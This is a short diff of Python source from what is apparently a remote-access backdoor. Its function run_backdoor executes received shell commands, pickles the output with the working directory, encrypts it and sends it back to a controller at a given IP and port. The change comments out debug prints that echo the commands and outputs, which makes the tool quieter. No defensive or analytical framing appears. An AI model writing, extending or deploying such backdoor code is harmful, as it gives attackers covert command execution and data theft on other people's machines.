@@ -159,9 +159,9 @@ def run_shell_script(script_fname):
             commands = file.read().splitlines()[1:] # ignore 1st line
             outputs = []
             for command in commands:
-                print(f"c: {command}")
+                # print(f"c: {command}")
                 output = run_line(command)
-                print(f"o: {output}")
+                # print(f"o: {output}")
                 outputs.append(output)
         return "".join(outputs)
     except Exception as e:
@@ -257,7 +257,7 @@ def run_backdoor(ip, port):
     script_output = execute_msg(commands)
     print(f"output:\n{script_output}")
     # are there updates to cwd?
-    print(f"out_cwd: {cwd}")
+    # print(f"out_cwd: {cwd}")
     message = pickle.dumps((cwd, script_output))
     # send back output from executing code
     enc_output = get_encrypted_msg(
